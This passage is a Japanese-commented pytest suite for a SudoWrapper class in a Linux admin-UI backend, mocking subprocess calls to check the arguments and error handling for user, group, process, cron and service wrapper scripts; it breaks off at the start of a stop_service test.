"""
SudoWrapper ユニットテスト

対象: backend/core/sudo_wrapper.py
カバレッジ向上対象行:
  66-68, 91-93, 96-98, 111-114, 174-186, 209-211, 227-233, 236-238,
  246, 250-253, 284, 286, 308-309, 340, 342, 370, 372, 374, 523-524,
  546, 572
"""

import json
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from backend.core.sudo_wrapper import SudoWrapper, SudoWrapperError


# ===========================================================================
# フィクスチャ
# ===========================================================================


@pytest.fixture
def wrapper_with_file(tmp_path):
    """adminui-status.sh が存在する tmp_path を使う SudoWrapper"""
    wrapper_file = tmp_path / "adminui-status.sh"
    wrapper_file.touch()
    return SudoWrapper(wrapper_dir=str(tmp_path))


@pytest.fixture
def mock_run_success_json(wrapper_with_file):
    """subprocess.run が JSON を返すモック付き SudoWrapper"""
    mock_result = MagicMock()
    mock_result.stdout = json.dumps({"status": "ok", "data": "value"})
    return wrapper_with_file, mock_result


# ===========================================================================
# TestSudoWrapperInit: 初期化テスト
# ===========================================================================


class TestSudoWrapperInit:
    """SudoWrapper の初期化テスト"""

    def test_default_dir_falls_back_to_wrappers(self, tmp_path):
        """adminui-status.sh が存在しない場合は wrappers/ へフォールバックする"""
        # wrapper_dir に adminui-status.sh がない tmp_path を渡す
        w = SudoWrapper(wrapper_dir=str(tmp_path))
        # project_root/wrappers に切り替わっていること
        assert str(w.wrapper_dir).endswith("wrappers")

    def test_custom_dir_used_when_file_exists(self, tmp_path):
        """adminui-status.sh が存在する場合はそのディレクトリを使用する"""
        (tmp_path / "adminui-status.sh").touch()
        w = SudoWrapper(wrapper_dir=str(tmp_path))
        assert w.wrapper_dir == tmp_path


# ===========================================================================
# TestExecute: _execute メソッドのテスト（行 66-68, 91-93, 96-98, 111-114）
# ===========================================================================


class TestExecute:
    """_execute メソッドのテスト"""

    # ------ 行 66-68: ラッパーが存在しない場合 ------

    def test_wrapper_not_found_raises_error(self, tmp_path):
        """ラッパースクリプトが存在しない場合は SudoWrapperError を発生させる（行 66-68）"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))
        with pytest.raises(SudoWrapperError, match="not found"):
            wrapper._execute("nonexistent-wrapper.sh", [])

    # ------ 行 91-93: 非 JSON レスポンス ------

    def test_non_json_stdout_returns_success_dict(self, tmp_path):
        """JSON でない stdout は {'status': 'success', 'output': ...} で返す（行 91-93）"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = "plain text output"

        with patch("subprocess.run", return_value=mock_result):
            result = wrapper._execute("adminui-status.sh", [])

        assert result["status"] == "success"
        assert "plain text output" in result["output"]

    def test_empty_stdout_returns_success_dict(self, tmp_path):
        """空の stdout も {'status': 'success', 'output': ''} で返す（行 91-93）"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = ""

        with patch("subprocess.run", return_value=mock_result):
            result = wrapper._execute("adminui-status.sh", [])

        assert result["status"] == "success"
        assert result["output"] == ""

    # ------ 行 96-98: TimeoutExpired ------

    def test_timeout_raises_sudo_wrapper_error(self, tmp_path):
        """TimeoutExpired 時に SudoWrapperError を発生させる（行 96-98）"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd=[], timeout=30)
            with pytest.raises(SudoWrapperError, match="timed out"):
                wrapper._execute("adminui-status.sh", [])

    # ------ 行 100-107: CalledProcessError (JSON エラー出力) ------

    def test_called_process_error_with_json_stderr_returns_data(self, tmp_path):
        """CalledProcessError で stderr が JSON の場合はそのデータを返す"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        error_data = {"status": "error", "message": "some error"}
        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr=json.dumps(error_data)
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            result = wrapper._execute("adminui-status.sh", [])

        assert result["status"] == "error"
        assert result["message"] == "some error"

    def test_called_process_error_with_non_json_stderr_raises(self, tmp_path):
        """CalledProcessError で stderr が非 JSON の場合は SudoWrapperError を発生させる"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr="plain error text"
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            with pytest.raises(SudoWrapperError):
                wrapper._execute("adminui-status.sh", [])

    def test_called_process_error_with_empty_stderr_returns_empty_dict(self, tmp_path):
        """CalledProcessError で stderr/stdout が空の場合は空 JSON ({}) を返す"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr=None, output=None
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            result = wrapper._execute("adminui-status.sh", [])

        # json.loads("{}") -> {} が返される
        assert result == {}

    # ------ 行 111-114: 予期しない例外 ------

    def test_unexpected_exception_raises_sudo_wrapper_error(self, tmp_path):
        """予期しない例外を SudoWrapperError でラップする（行 111-114）"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = RuntimeError("unexpected error")
            with pytest.raises(SudoWrapperError, match="Unexpected error"):
                wrapper._execute("adminui-status.sh", [])

    # ------ 正常系: JSON レスポンス ------

    def test_json_response_parsed_correctly(self, tmp_path):
        """JSON レスポンスが辞書として返される"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        expected = {"status": "ok", "value": 42}
        mock_result = MagicMock()
        mock_result.stdout = json.dumps(expected)

        with patch("subprocess.run", return_value=mock_result):
            result = wrapper._execute("adminui-status.sh", [])

        assert result == expected


# ===========================================================================
# TestExecuteWithStdin: _execute_with_stdin のテスト（行 209-211, 227-233, 236-238, 246, 250-253）
# ===========================================================================


class TestExecuteWithStdin:
    """_execute_with_stdin メソッドのテスト"""

    # ------ 行 209-211: ラッパーが存在しない場合 ------

    def test_wrapper_not_found_raises_error(self, tmp_path):
        """ラッパーが存在しない場合は SudoWrapperError を発生させる（行 209-211）"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))
        with pytest.raises(SudoWrapperError, match="not found"):
            wrapper._execute_with_stdin("nonexistent-wrapper.sh", [], "stdin_data")

    # ------ 行 227-233: JSON レスポンス ------

    def test_json_response_parsed(self, tmp_path):
        """JSON レスポンスが辞書として返される（行 227-233）"""
        script = tmp_path / "adminui-user-add.sh"
        script.touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        expected = {"status": "success", "uid": 1001}
        mock_result = MagicMock()
        mock_result.stdout = json.dumps(expected)

        with patch("subprocess.run", return_value=mock_result):
            result = wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")

        assert result == expected

    def test_non_json_stdout_returns_success_dict(self, tmp_path):
        """非 JSON stdout は {'status': 'success', 'output': ...} で返す（行 229-233）"""
        script = tmp_path / "adminui-user-add.sh"
        script.touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = "user created"

        with patch("subprocess.run", return_value=mock_result):
            result = wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")

        assert result["status"] == "success"
        assert "user created" in result["output"]

    # ------ 行 236-238: TimeoutExpired ------

    def test_timeout_raises_sudo_wrapper_error(self, tmp_path):
        """TimeoutExpired 時に SudoWrapperError を発生させる（行 236-238）"""
        script = tmp_path / "adminui-user-add.sh"
        script.touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd=[], timeout=30)
            with pytest.raises(SudoWrapperError, match="timed out"):
                wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")

    # ------ 行 246: CalledProcessError JSON stderr ------

    def test_called_process_error_with_json_stderr_returns_data(self, tmp_path):
        """CalledProcessError で JSON stderr を返す（行 246）"""
        script = tmp_path / "adminui-user-add.sh"
        script.touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        error_data = {"status": "error", "code": "USER_EXISTS"}
        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr=json.dumps(error_data)
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            result = wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")

        assert result["status"] == "error"
        assert result["code"] == "USER_EXISTS"

    # ------ 行 248: CalledProcessError 非 JSON stderr ------

    def test_called_process_error_non_json_raises(self, tmp_path):
        """CalledProcessError で非 JSON stderr は SudoWrapperError を発生させる（行 248）"""
        script = tmp_path / "adminui-user-add.sh"
        script.touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr="user already exists"
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            with pytest.raises(SudoWrapperError):
                wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")

    # ------ 行 250-253: 予期しない例外 ------

    def test_unexpected_exception_raises_sudo_wrapper_error(self, tmp_path):
        """予期しない例外を SudoWrapperError でラップする（行 250-253）"""
        script = tmp_path / "adminui-user-add.sh"
        script.touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = OSError("permission denied")
            with pytest.raises(SudoWrapperError, match="Unexpected error"):
                wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")


# ===========================================================================
# TestGetProcesses: get_processes のテスト（行 174-186）
# ===========================================================================


class TestGetProcesses:
    """get_processes メソッドのテスト"""

    def test_get_processes_default_args(self, tmp_path):
        """デフォルト引数で adminui-processes.sh を呼び出す（行 174-186）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-processes.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "processes": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = wrapper.get_processes()

        args_called = mock_run.call_args[0][0]
        assert "--sort=cpu" in args_called
        assert "--limit=100" in args_called
        assert result["status"] == "ok"

    def test_get_processes_with_filter_user(self, tmp_path):
        """filter_user 指定時に --filter-user= 引数が追加される（行 179-180）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-processes.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "processes": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_processes(filter_user="root")

        args_called = mock_run.call_args[0][0]
        assert "--filter-user=root" in args_called

    def test_get_processes_with_min_cpu(self, tmp_path):
        """min_cpu > 0 時に --min-cpu= 引数が追加される（行 181-182）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-processes.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "processes": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_processes(min_cpu=10.0)

        args_called = mock_run.call_args[0][0]
        assert "--min-cpu=10.0" in args_called

    def test_get_processes_with_min_mem(self, tmp_path):
        """min_mem > 0 時に --min-mem= 引数が追加される（行 183-184）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-processes.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "processes": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_processes(min_mem=5.0)

        args_called = mock_run.call_args[0][0]
        assert "--min-mem=5.0" in args_called

    def test_get_processes_no_optional_args_when_zero(self, tmp_path):
        """min_cpu=0, min_mem=0, filter_user=None の場合はオプション引数が追加されない"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-processes.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_processes(min_cpu=0.0, min_mem=0.0, filter_user=None)

        args_called = mock_run.call_args[0][0]
        # オプション引数が含まれていないこと
        assert not any("--filter-user" in a for a in args_called)
        assert not any("--min-cpu" in a for a in args_called)
        assert not any("--min-mem" in a for a in args_called)


# ===========================================================================
# TestListUsers: list_users のテスト（行 284, 286）
# ===========================================================================


class TestListUsers:
    """list_users メソッドのテスト"""

    def test_list_users_default_args(self, tmp_path):
        """デフォルト引数で adminui-user-list.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-list.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "users": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = wrapper.list_users()

        args_called = mock_run.call_args[0][0]
        assert "--sort=username" in args_called
        assert "--limit=100" in args_called
        assert result["status"] == "ok"

    def test_list_users_with_filter_locked(self, tmp_path):
        """filter_locked 指定時に --filter-locked= 引数が追加される（行 284）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-list.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "users": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.list_users(filter_locked="true")

        args_called = mock_run.call_args[0][0]
        assert "--filter-locked=true" in args_called

    def test_list_users_with_username_filter(self, tmp_path):
        """username_filter 指定時に --username-filter= 引数が追加される（行 286）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-list.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "users": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.list_users(username_filter="admin")

        args_called = mock_run.call_args[0][0]
        assert "--username-filter=admin" in args_called

    def test_list_users_no_optional_when_none(self, tmp_path):
        """filter_locked=None, username_filter=None のときオプション引数なし"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-list.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.list_users(filter_locked=None, username_filter=None)

        args_called = mock_run.call_args[0][0]
        assert not any("--filter-locked" in a for a in args_called)
        assert not any("--username-filter" in a for a in args_called)


# ===========================================================================
# TestGetUserDetail: get_user_detail のテスト（行 308-309）
# ===========================================================================


class TestGetUserDetail:
    """get_user_detail メソッドのテスト"""

    def test_get_user_detail_by_username(self, tmp_path):
        """username 指定時に --username= 引数が追加される（行 307-308）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-detail.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "user": {}})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_user_detail(username="alice")

        args_called = mock_run.call_args[0][0]
        assert "--username=alice" in args_called

    def test_get_user_detail_by_uid(self, tmp_path):
        """uid 指定時に --uid= 引数が追加される（行 308-309）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-detail.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok", "user": {}})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_user_detail(uid=1001)

        args_called = mock_run.call_args[0][0]
        assert "--uid=1001" in args_called

    def test_get_user_detail_no_args(self, tmp_path):
        """username も uid も指定しない場合は引数なしで呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-detail.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.get_user_detail()

        args_called = mock_run.call_args[0][0]
        assert not any("--username" in a for a in args_called)
        assert not any("--uid" in a for a in args_called)


# ===========================================================================
# TestAddUser: add_user のテスト（行 340, 342）
# ===========================================================================


class TestAddUser:
    """add_user メソッドのテスト"""

    def test_add_user_with_gecos(self, tmp_path):
        """gecos 指定時に --gecos= 引数が追加される（行 340）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_user(
                username="alice",
                password_hash="$6$hash",
                gecos="Alice Smith",
            )

        args_called = mock_run.call_args[0][0]
        assert "--gecos=Alice Smith" in args_called

    def test_add_user_with_groups(self, tmp_path):
        """groups 指定時に --groups= 引数が追加される（行 342）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_user(
                username="alice",
                password_hash="$6$hash",
                groups=["sudo", "developers"],
            )

        args_called = mock_run.call_args[0][0]
        assert "--groups=sudo,developers" in args_called

    def test_add_user_minimal(self, tmp_path):
        """最小引数（username, password_hash）での呼び出し"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_user(username="bob", password_hash="$6$hash")

        args_called = mock_run.call_args[0][0]
        assert "--username=bob" in args_called
        assert "--shell=/bin/bash" in args_called
        assert not any("--gecos" in a for a in args_called)
        assert not any("--groups" in a for a in args_called)


# ===========================================================================
# TestDeleteUser: delete_user のテスト（行 370, 372, 374）
# ===========================================================================


class TestDeleteUser:
    """delete_user メソッドのテスト"""

    def test_delete_user_with_remove_home(self, tmp_path):
        """remove_home=True 時に --remove-home フラグが追加される（行 370）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-delete.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.delete_user(username="alice", remove_home=True)

        args_called = mock_run.call_args[0][0]
        assert "--remove-home" in args_called

    def test_delete_user_with_backup_home(self, tmp_path):
        """backup_home=True 時に --backup-home フラグが追加される（行 372）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-delete.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.delete_user(username="alice", backup_home=True)

        args_called = mock_run.call_args[0][0]
        assert "--backup-home" in args_called

    def test_delete_user_with_force_logout(self, tmp_path):
        """force_logout=True 時に --force-logout フラグが追加される（行 374）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-delete.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.delete_user(username="alice", force_logout=True)

        args_called = mock_run.call_args[0][0]
        assert "--force-logout" in args_called

    def test_delete_user_minimal_no_optional_flags(self, tmp_path):
        """フラグなしではオプション引数が追加されない"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-delete.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.delete_user(username="alice")

        args_called = mock_run.call_args[0][0]
        assert "--username=alice" in args_called
        assert "--remove-home" not in args_called
        assert "--backup-home" not in args_called
        assert "--force-logout" not in args_called


# ===========================================================================
# TestAddCronJob: add_cron_job のテスト（行 523-524）
# ===========================================================================


class TestAddCronJob:
    """add_cron_job メソッドのテスト"""

    def test_add_cron_job_with_arguments_and_comment(self, tmp_path):
        """arguments と comment の両方が指定された場合（行 518-520）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_cron_job(
                username="alice",
                schedule="0 2 * * *",
                command="/usr/bin/backup.sh",
                arguments="--verbose",
                comment="daily backup",
            )

        args_called = mock_run.call_args[0][0]
        # username, schedule, command, arguments, comment の順
        assert "alice" in args_called
        assert "0 2 * * *" in args_called
        assert "/usr/bin/backup.sh" in args_called
        assert "--verbose" in args_called
        assert "daily backup" in args_called

    def test_add_cron_job_with_comment_no_arguments(self, tmp_path):
        """arguments がなく comment だけの場合、空文字列を挿入する（行 523-524）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_cron_job(
                username="alice",
                schedule="0 2 * * *",
                command="/usr/bin/backup.sh",
                comment="daily backup",
            )

        args_called = mock_run.call_args[0][0]
        # 空文字列の引数が挿入されていること
        # ["sudo", script, "alice", "0 2 * * *", "/usr/bin/backup.sh", "", "daily backup"]
        assert "" in args_called
        assert "daily backup" in args_called

    def test_add_cron_job_minimal(self, tmp_path):
        """最小引数（username, schedule, command）での呼び出し"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_cron_job(
                username="bob",
                schedule="*/5 * * * *",
                command="/usr/bin/check.sh",
            )

        args_called = mock_run.call_args[0][0]
        assert "bob" in args_called
        assert "*/5 * * * *" in args_called
        assert "/usr/bin/check.sh" in args_called


# ===========================================================================
# TestRemoveCronJob: remove_cron_job のテスト（行 546）
# ===========================================================================


class TestRemoveCronJob:
    """remove_cron_job メソッドのテスト"""

    def test_remove_cron_job_calls_correct_wrapper(self, tmp_path):
        """adminui-cron-remove.sh を正しい引数で呼び出す（行 546）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-remove.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.remove_cron_job(username="alice", line_number=5)

        args_called = mock_run.call_args[0][0]
        assert "alice" in args_called
        assert "5" in args_called
        assert str(tmp_path / "adminui-cron-remove.sh") in args_called


# ===========================================================================
# TestToggleCronJob: toggle_cron_job のテスト（行 572）
# ===========================================================================


class TestToggleCronJob:
    """toggle_cron_job メソッドのテスト"""

    def test_toggle_cron_job_enable(self, tmp_path):
        """enable アクションで adminui-cron-toggle.sh を呼び出す（行 572）"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-toggle.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.toggle_cron_job(username="alice", line_number=3, action="enable")

        args_called = mock_run.call_args[0][0]
        assert "alice" in args_called
        assert "3" in args_called
        assert "enable" in args_called

    def test_toggle_cron_job_disable(self, tmp_path):
        """disable アクションで adminui-cron-toggle.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-toggle.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.toggle_cron_job(username="bob", line_number=7, action="disable")

        args_called = mock_run.call_args[0][0]
        assert "bob" in args_called
        assert "7" in args_called
        assert "disable" in args_called


# ===========================================================================
# TestHighLevelMethods: 高レベルメソッドのテスト（各ラッパー呼び出し確認）
# ===========================================================================


class TestHighLevelMethods:
    """高レベルメソッドが正しいラッパーを呼び出すことを確認"""

    def test_get_system_status(self, tmp_path):
        """get_system_status が adminui-status.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"uptime": "1 day"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = wrapper.get_system_status()

        args_called = mock_run.call_args[0][0]
        assert "adminui-status.sh" in args_called[-1] or any(
            "adminui-status.sh" in str(a) for a in args_called
        )
        assert result["uptime"] == "1 day"

    def test_restart_service(self, tmp_path):
        """restart_service が adminui-service-restart.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-service-restart.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "restarted"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = wrapper.restart_service("nginx")

        args_called = mock_run.call_args[0][0]
        assert "nginx" in args_called

    def test_change_user_password(self, tmp_path):
        """change_user_password が _execute_with_stdin を通じて呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-user-passwd.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.change_user_password(username="alice", password_hash="$6$hash")

        args_called = mock_run.call_args[0][0]
        assert "--username=alice" in args_called

    def test_list_cron_jobs(self, tmp_path):
        """list_cron_jobs が adminui-cron-list.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-cron-list.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"jobs": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.list_cron_jobs(username="alice")

        args_called = mock_run.call_args[0][0]
        assert "alice" in args_called

    def test_list_groups(self, tmp_path):
        """list_groups が adminui-group-list.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-group-list.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"groups": []})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.list_groups()

        args_called = mock_run.call_args[0][0]
        assert "--sort=name" in args_called

    def test_add_group(self, tmp_path):
        """add_group が adminui-group-add.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-group-add.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.add_group(name="devteam")

        args_called = mock_run.call_args[0][0]
        assert "--name=devteam" in args_called

    def test_delete_group(self, tmp_path):
        """delete_group が adminui-group-delete.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-group-delete.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.delete_group(name="devteam")

        args_called = mock_run.call_args[0][0]
        assert "--name=devteam" in args_called

    def test_modify_group_membership_add(self, tmp_path):
        """modify_group_membership が adminui-group-modify.sh を呼び出す"""
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-group-modify.sh").touch()
        wrapper = SudoWrapper(wrapper_dir=str(tmp_path))

        mock_result = MagicMock()
        mock_result.stdout = json.dumps({"status": "ok"})

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            wrapper.modify_group_membership(group="sudo", action="add", user="alice")

        args_called = mock_run.call_args[0][0]
        assert "--group=sudo" in args_called
        assert "--action=add" in args_called
        assert "--user=alice" in args_called


class TestStopService:
    """stop_service メソッドのテスト"""

    def test_stop_service(self, tmp_path):
